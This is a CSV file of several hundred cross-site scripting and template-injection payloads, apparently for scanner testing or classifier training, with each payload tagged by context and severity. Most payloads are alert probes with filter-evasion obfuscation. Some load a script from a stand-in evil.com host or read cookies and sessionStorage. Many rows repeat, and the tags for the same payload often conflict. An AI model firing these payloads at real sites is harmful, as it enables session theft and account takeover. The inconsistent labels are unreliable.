payload,context,severity
"setTimeout(""alert(1)"",0)",dom_sink,low
<body onload=alert(1)>,event_handler,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<%= confirm(1) %>,template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
javascript:alert(	document.domain),js_uri,low
"\""><img src=x onload=alert(1)>",script_injection,medium
<img src/onerror=prompt(8)>,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"%20""><svg onload=alert(1)>",html_body,medium
"<scRiPt>Alert(sTring.fRoMcHarcoDE(88,83,83))</scRipt>",html_body,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
${alert(1)},template_injection,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<button ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,medium
' onmouseover=alert(1) ',attribute,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
<iframe/onload=alert(0);>,html_body,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
setInterval('ale'+'rt(10)');,attribute,high
"<embed src=""javascript:alert(1)"">",script_injection,high
setInterval('ale'+'rt(10)');,html_body,high
"<object data=""javascript:al'+'ert(1)"">",tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"<object data=""javascript:confirm(1)"">",tag_injection,high
innerHTML=location.hash>#<script>prompt`1`</script>,html_body,high
"<video>alert(String.fromCharCode(88,83,83))</script>",attribute,high
""" onload=confirm(1) x=""",attribute,high
""" onerror
=alert(	1) x
=""",attribute,low
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<BODY ONLOAD=alert(8839)>,html_body,medium
<img/’onerror=alert(1) src=a>,html_body,medium
"eval(""alert(1)"")",script_injection,high
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<iframe src=""javascript:alert(1)"">",event_handler,medium
jAvAsCrIpT:AlErT(1),js_uri,high
{{constructor.constructor(alert`AnonKryptiQuz`)()}},js_string,low
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
confirm(),html_body,medium
"<sCRIPt>d.inneRHTml+='';</scRiPT>//[""'`-->]]>]</DIV>",html_body,high
<img src=x onerror=\u0061\u006cert(1)>,tag_injection,high
"<svg onload=""confirm(7)"">",html_body,medium
‘ onfocus=’alert(1)’ autofocus=’,html_body,medium
alert(2),html_body,medium
<script>confirm(1)</script>,event_handler,medium
<textarea>d.innerHTML+='';</script>,html_body,high
\x3cdetails open ontoggle=alert(1)\x3e,attribute,low
' onmouseover=alert(1) ',attribute,high
<%= alert(1) %>,script_injection,high
""" onerror=window.alert(1)1 a=""",attribute,medium
alert(1);,html_body,medium
"<svg onload=""confirm(7)"">",html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
<svg////////onload=alert(1)>,html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
onerror=prompt(1);>,html_body,medium
onload=”alert(‘AnonKryptiQuz’),attribute,medium
<script src=//evil.com/xss.js></script>,js_uri,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<img/src=x onerror=confirm(1)//>,event_handler,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
setInterval('ale'+'rt(10)');,attribute,high
"\"" onload=alert(1)//",attribute_escape,low
${alert(1)},template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",attribute,medium
"""><svG OnLoaD=ALerT(1)>",attribute,medium
"eval(""alert(1)"")",attribute,medium
"document.write(	""<img src
=x onerror
=alert(	1)>"")",dom_sink,high
<details open ontoggle=alert(1)>,event_handler,medium
javascript:alert(1),event_handler,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
onerror=alert(0);>,html_body,medium
confirm(),html_body,medium
"onerror=""prompt`1`""",html_body,medium
prompt(9),html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
"""><img src=x onerror=alert(1)>",js_uri,medium
<script>alert(document.domain)</script>,script_injection,medium
&lt;marquee onstart=alert(1)&gt;,dom_sink,high
"//"";confirm`1`)",attribute,high
"print())//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
setInterval('ale'+'rt(10)');,html_body,high
"%20""><svg onload=alert(1)>",html_body,medium
<script>confirm(1)</script>,script_injection,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,high
<body oncut=alert(1)><script>fetch('//xyz')</script>,html_body,high
onerror='alert(1)',html_body,medium
alert(1),html_body,medium
"\"" onerror=alert(1)//",event_handler,high
"""><svg onchange=alert()>",html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
""" onload=alert(1) x=""",attribute_escape,high
"<svg onload=""confirm(7)"">",html_body,medium
' onmouseover=alert(1) ',event_handler,high
""" onload=alert(1) x=""",attribute,low
%3Cscript src=//evil.com/xss.js%3E%3C/script%3E,script_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
<BODY ONLOAD=alert(’XSS’)>,attribute,medium
alert(2),html_body,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
<img src=x onerror=alert(1)>,tag_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
<%= confirm(1) %>,js_uri,medium
<input onfocus=alert(1) autofocus>,event_handler,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
""" onerror=alert(1) x=""",js_uri,medium
<input onfocus=alert(1) autofocus>,event_handler,low
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
onerror=alert;throw 23;,html_body,low
setInterval('ale'+'rt(10)');,html_body,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
\' onerror=confirm(1)//,attribute_escape,medium
onload='window.alert(1)',html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"""><embed onload=alert()>",html_body,medium
"<svg onload=""confirm(7)"">",html_body,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
onload='self.alert(1)',html_body,medium
' onerror=alert(1) x=',js_uri,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
\' OnErRoR=AlErT(1)//,attribute_escape,high
javascript:alert(document.domain),js_uri,high
&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
<img src/onerror=prompt(8)>,html_body,medium
jAvAsCrIpT:CoNfIrM(1),js_uri,high
jAvAsCrIpT:AlErT(1),js_uri,medium
\' onerror=alert(1)//,attribute_escape,medium
"""></SCRIPT>”>’><SCRIPT>alert(document.domain))</SCRIPT>",html_body,high
"<scRiPt>aleRT(sTriNG.FROMChARCodE(88,83,83))</sCripT>",html_body,high
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
javascript:alert(document.domain),js_uri,low
<img src=x onerror=alert(1)>,tag_injection,medium
<script>alert(1)</script>,generic,medium
OnLOAD='aLERt(1)',html_body,medium
{{7*7}},template_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<svg/onload=confirm(1)>,tag_injection,high
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,high
"oNerRor=""alErT(1)""",html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"<SCript>aleRT(sTRinG.fROmcharcodE(88,83,83))</scripT>",html_body,high
"""><svg onload=alert()>",html_body,medium
<img/src=x onerror=confirm(1)//>,dom_sink,high
<img src/onerror=alert(1)>,html_body,medium
<svg onload=alert(1)>,event_handler,high
"<svg onload=""confirm(7)"">",html_body,medium
' onerror=alert(1) x=',event_handler,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<SCRIPT>confirm(1)</SCRIPT>,script_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
%3Cinput onfocus=alert(1) autofocus%3E,event_handler,medium
[45].some.alert(),html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,attribute,high
&quot; onload=alert(1) x=&quot;,attribute_escape,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",js_block,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
javascript:alert(	1),tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
</tag><svg onload=alert(1)>,html_body,medium
"\"" onerror=alert(1)//",dom_sink,low
"""><script alert(String.fromCharCode(88,83,83))</script>",attribute,high
<img src=x onerror=alert(1)>,dom_sink,low
"\""><img src
=x onerror
=alert(	1)>",attribute_escape,medium
"""><script
 alert(String.fromCharCode(88,83,83))</script>",attribute,high
onerror='alert(1)',html_body,medium
"""><img src=x onerror=alert(1)>",attribute,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"onload=""alert(1)""",html_body,medium
<img/src=x onerror=alert(1)//>,event_handler,medium
<script>alert(1)</script>,tag_injection,medium
<marquee onstart=alert(1)>,event_handler,medium
<img src=x onerror=alert(1)>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,attribute,low
javascript:confirm(document.domain),js_uri,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
' onerror=alert(1) x=',attribute,medium
innerHTML&#61;location.hash>#<script>alert(1)</script>,html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
<script src=//evil.com/xss.js></script>,script_injection,low
"eval(""confirm(1)"")",event_handler,high
<svg id=1 onload=confirm(1)>,html_body,medium
${alert(1)},template_injection,high
alert(1),html_body,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
javascript:alert(document.domain),js_uri,medium
"<details open ontoggle
=alert(	1)>",event_handler,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
""" onmouseover=alert()1 a=""",attribute,medium
javascript:confirm(1),js_uri,medium
""" onerror=\u0061\u006cert(1) x=""",attribute,medium
<marquee onstart=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute,low
‘ onfocus=’alert(1)’,html_body,medium
onerror=alert;throw 23;,html_body,low
"eval(""confirm(1)"")",dom_sink,medium
<img src/onerror=prompt(8)>,html_body,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
prompt(9),html_body,medium
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"<object data=""javascript:confirm(1)"">",tag_injection,low
<BODY ONLOAD=alert(’XSS’)>,html_body,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"""><%00script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<BODY ONLOAD=alert(8839)>,html_body,medium
\' onload=alert(1)//,attribute_escape,medium
location='javascript:ale'+'rt(12)';,js_block,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"eval(""alert(1)"")",dom_sink,low
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
setInterval('ale'+'rt(10)');,html_body,high
<script>alert(1)</script>,script_injection,low
-alert(1)-',html_body,medium
<body onsearch=alert(1)><script>fetch('//xyz')</script>,html_body,high
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",attribute,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
<body onload=alert(1)>,event_handler,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
"eval(""al'+'ert(1)"")",dom_sink,low
"\""><img src=x onerror=alert(1)>",attribute_escape,high
"onload=""alert(1)""",html_body,medium
"<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
;alert(1);,html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
alert(2),html_body,medium
"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",event_handler,low
<marquee onstart=alert(1)>,event_handler,low
{{7*7}},template_injection,medium
<svg onload=alert()>,attribute,medium
javascript:alert(document.domain),js_uri,high
"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<scr/**/ipt>alert(document.domain)</scr/**/ipt>,script_injection,high
seTinterVAL('ALE'+'Rt(10)');,html_body,high
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
confirm`1`,attribute,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
javascript:confirm(1),js_uri,low
"<embed src=""javascript:confirm(1)"">",template_injection,high
${alert(1)},template_injection,low
<img/src/onerror=alert(1),html_body,medium
\' OnErRoR=AlErT(1)//,attribute_escape,medium
{{$emit.constructor`alert(1)`()}},js_string,medium
<video src=x onload=alert(1)>,event_handler,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<svg onload=alert(1)>,event_handler,low
"onload=""alert(document.cookie)""",html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
<scr/**/ipt>confirm(1)</scr/**/ipt>,script_injection,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
{{7*7}},template_injection,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
"<svg onload=""confirm(7)"">",html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
<svg onload=alert(1)>,template_injection,low
"\""&gt;&lt;img src=x onerror=alert(1)&gt;",attribute_escape,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<svg/onload=alert(1)>,tag_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",html_body,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
onload='alert(document.domain)',attribute,medium
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,event_handler,low
#{\u0061\u006cert(1)},dom_sink,medium
\' onerror=alert(1)//,dom_sink,high
"<sCRipt>alERT(STriNg.FromcHArCoDE(88,83,83))</scRipT>",html_body,high
<input onfocus=alert(1) autofocus>,event_handler,low
#{alert(1)},template_injection,medium
CONFIrm(),attribute,medium
"{{toString.constructor.prototype.charAt=toString.constructor.prototype.substr;alert(toString.constructor.fromCharCode(97,108,101,114,116,40,49,41))}}",js_string,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
"document.write(""<img src=x onerror=confirm(1)>"")",event_handler,medium
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,tag_injection,medium
"data:text/html,<SCRIPT>alert(1)</SCRIPT>",template_injection,medium
<video src=x onerror=alert(1)>,attribute,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
onload='alert(1)',html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<svg ONLoaD=ALeRt()>,attribute,medium
<svgonload=alert(1)>,html_body,medium
<img/src=x onerror=confirm(1)//>,attribute,medium
